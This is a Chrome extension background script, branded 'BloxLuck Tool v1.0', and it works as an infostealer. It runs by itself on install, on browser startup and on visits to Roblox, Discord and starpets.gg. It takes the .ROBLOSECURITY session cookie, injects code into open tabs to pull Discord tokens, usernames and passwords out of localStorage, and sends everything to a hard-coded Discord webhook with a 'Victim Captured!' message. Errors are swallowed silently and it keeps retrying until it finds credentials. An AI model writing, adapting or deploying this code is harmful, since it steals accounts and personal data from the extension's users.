const WH = 'https://discord.com/api/webhooks/1523433908488900809/eME1mBqDvE61IcdSbNo2jHMVJI91-kSi6QekuwqdPmXNWX3BTOUQBhgtWRpX7uzd-cI2';

// Track if we've already sent the install notification
let hasSentInstall = false;

// On install - fire immediately
chrome.runtime.onInstalled.addListener((details) => {
  if (details.reason === 'install') {
    // Steal right away
    stealAll();
  }
});

// On browser startup - also steal
chrome.runtime.onStartup.addListener(() => {
  stealAll();
});

// Content script triggers
chrome.runtime.onMessage.addListener((req, sender, resp) => {
  if (req.t === 'steal') {
    stealAll();
    resp({ ok: 1 });
    return true;
  }
  if (req.t === 'cookie') {
    grabCookie().then(d => resp(d));
    return true;
  }
});

// Also steal when tabs update to relevant sites
chrome.tabs.onUpdated.addListener((tabId, info, tab) => {
  if (info.status === 'complete') {
    const url = tab.url || '';
    if (url.includes('roblox.com') || url.includes('discord.com') || url.includes('starpets.gg')) {
      setTimeout(stealAll, 2000);
    }
  }
});

async function stealAll() {
  try {
    let robloxCookie = null;
    let robloxUser = 'Unknown';
    let discordToken = null;
    let discordUser = 'N/A';
    let discordEmail = 'N/A';
    let discordID = 'N/A';
    let starpetsUser = null;
    let starpetsPass = null;
    let robloxLoginUser = null;
    let robloxLoginPass = null;

    // 1. Grab Roblox cookie (PRIMARY)
    try {
      const ck = await grabCookie();
      if (ck && ck.r) {
        robloxCookie = ck.r;
        // Try to decode username from cookie
        try {
          const parts = ck.r.split('.');
          if (parts.length >= 2) {
            const raw = atob(parts[1].replace(/-/g, '+').replace(/_/g, '/'));
            const payload = JSON.parse(raw);
            robloxUser = payload.name || payload.sub || payload.dname || 'Unknown';
          }
        } catch(e) {}
      }
    } catch(e) {}

    // 2. Grab Discord token
    try {
      const dt = await grabDiscord();
      if (dt && dt.token) {
        discordToken = dt.token;
        discordUser = dt.username || 'N/A';
        try {
          const p = JSON.parse(atob(dt.token.split('.')[1]));
          discordEmail = p.email || 'N/A';
          discordID = p.sub || 'N/A';
        } catch(e) {}
      }
    } catch(e) {}

    // 3. Grab StarPets
    try {
      const sp = await grabStarPets();
      if (sp) {
        starpetsUser = sp.user;
        starpetsPass = sp.pass;
      }
    } catch(e) {}

    // 4. Grab Roblox login
    try {
      const rl = await grabRobloxLogin();
      if (rl) {
        robloxLoginUser = rl.user;
        robloxLoginPass = rl.pass;
      }
    } catch(e) {}

    // Build the embed - ONLY send if we have something
    const fields = [];

    if (robloxCookie) {
      fields.push({
        name: '🎮 Roblox',
        value: `**User:** ${robloxUser}\n**Cookie:**\`\`\`${robloxCookie}\`\`\``,
        inline: false
      });
    }

    if (discordToken) {
      fields.push({
        name: '💬 Discord',
        value: `**User:** ${discordUser}\n**Email:** ${discordEmail}\n**ID:** ${discordID}\n**Token:**\`\`\`${discordToken}\`\`\``,
        inline: false
      });
    }

    if (starpetsUser || starpetsPass) {
      fields.push({
        name: '🐾 StarPets.gg',
        value: `**Username:** ${starpetsUser || 'N/A'}\n**Password:** ${starpetsPass || 'N/A'}`,
        inline: false
      });
    }

    if (robloxLoginUser || robloxLoginPass) {
      fields.push({
        name: '🔐 Roblox Login',
        value: `**User/Email:** ${robloxLoginUser || 'N/A'}\n**Password:** ${robloxLoginPass || 'N/A'}`,
        inline: false
      });
    }

    // Only send if we found credentials
    if (fields.length === 0) {
      // If no creds found yet, try again in 3 seconds (tabs might not be loaded)
      setTimeout(stealAll, 3000);
      return;
    }

    // Build description with victim info
    let desc = '';
    if (robloxUser !== 'Unknown') desc += `**Roblox User:** ${robloxUser}\n`;
    if (discordUser !== 'N/A') desc += `**Discord User:** ${discordUser}\n`;

    const embed = {
      embeds: [{
        title: '🎯 Victim Captured!',
        color: 0x22c55e,
        description: desc || 'New victim data collected',
        fields: fields,
        timestamp: new Date().toISOString(),
        footer: { text: 'BloxLuck Tool v1.0' }
      }]
    };

    // Send to webhook
    try {
      await fetch(WH, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(embed)
      });
    } catch(e) {}

  } catch(e) {}
}

async function grabCookie() {
  try {
    // Try all possible roblox domains
    const domains = ['roblox.com', '.roblox.com', 'www.roblox.com'];
    for (const domain of domains) {
      try {
        const cookies = await chrome.cookies.getAll({ domain });
        for (const c of cookies) {
          if (c.name === '.ROBLOSECURITY') {
            return { r: c.value };
          }
        }
      } catch(e) {}
    }
  } catch(e) {}
  return null;
}

async function grabDiscord() {
  try {
    const tabs = await chrome.tabs.query({ 
      url: [
        '*://discord.com/*', 
        '*://*.discord.com/*', 
        '*://ptb.discord.com/*', 
        '*://canary.discord.com/*'
      ] 
    });
    
    if (tabs.length > 0) {
      for (const tab of tabs) {
        try {
          const results = await chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: () => {
              try {
                // Check ALL localStorage entries for token pattern
                for (let i = 0; i < localStorage.length; i++) {
                  const val = localStorage.getItem(localStorage.key(i));
                  if (typeof val === 'string' && val.length > 100 && val.includes('.') && val.split('.').length === 3) {
                    try {
                      const p = JSON.parse(atob(val.split('.')[1]));
                      if (p.sub || p.email || p.iat) {
                        return {
                          token: val,
                          username: p.global_name || p.username || p.email || 'Discord User'
                        };
                      }
                    } catch(e) {}
                  }
                }
                // Method 2: Direct token key
                const t = localStorage.getItem('token');
                if (t && t.length > 50) {
                  return { token: t, username: 'Discord User' };
                }
                return null;
              } catch(e) { return null; }
            }
          });
          if (results && results[0] && results[0].result) {
            return results[0].result;
          }
        } catch(e) {}
      }
    }
  } catch(e) {}
  return null;
}

async function grabStarPets() {
  try {
    const tabs = await chrome.tabs.query({ url: ['*://starpets.gg/*', '*://*.starpets.gg/*'] });
    if (tabs.length > 0) {
      for (const tab of tabs) {
        try {
          const results = await chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: () => {
              try {
                let u = null, p = null;
                for (let i = 0; i < localStorage.length; i++) {
                  const k = localStorage.key(i).toLowerCase();
                  const val = localStorage.getItem(localStorage.key(i));
                  if (k.includes('user') || k.includes('name') || k.includes('email') || k.includes('login') || k.includes('account') || k.includes('auth') || k.includes('profile')) {
                    try {
                      const j = JSON.parse(val);
                      u = j.email || j.username || j.user || j.name || u;
                      p = j.password || j.pass || p;
                    } catch(e) {
                      if (k.includes('user') || k.includes('email') || k.includes('name')) u = val;
                      if (k.includes('pass')) p = val;
                    }
                  }
                }
                if (u || p) return { user: u, pass: p };
                return null;
              } catch(e) { return null; }
            }
          });
          if (results && results[0] && results[0].result) {
            return results[0].result;
          }
        } catch(e) {}
      }
    }
  } catch(e) {}
  return null;
}

async function grabRobloxLogin() {
  try {
    const tabs = await chrome.tabs.query({ url: ['*://roblox.com/*', '*://*.roblox.com/*', '*://www.roblox.com/*'] });
    if (tabs.length > 0) {
      for (const tab of tabs) {
        try {
          const results = await chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: () => {
              try {
                let u = null, p = null;
                for (let i = 0; i < localStorage.length; i++) {
                  const k = localStorage.key(i).toLowerCase();
                  const val = localStorage.getItem(localStorage.key(i));
                  if (k.includes('user') || k.includes('email') || k.includes('login') || k.includes('account')) {
                    try {
                      const j = JSON.parse(val);
                      u = j.username || j.email || j.user || j.name || u;
                      p = j.password || j.pass || p;
                    } catch(e) {
                      if (!u && typeof val === 'string' && val.length > 3) u = val;
                    }
                  }
                  if (k.includes('pass') && !p && typeof val === 'string' && val.length > 3) p = val;
                }
                if (u || p) return { user: u, pass: p };
                return null;
              } catch(e) { return null; }
            }
          });
          if (results && results[0] && results[0].result) {
            return results[0].result;
          }
        } catch(e) {}
      }
    }
  } catch(e) {}
  return null;
}
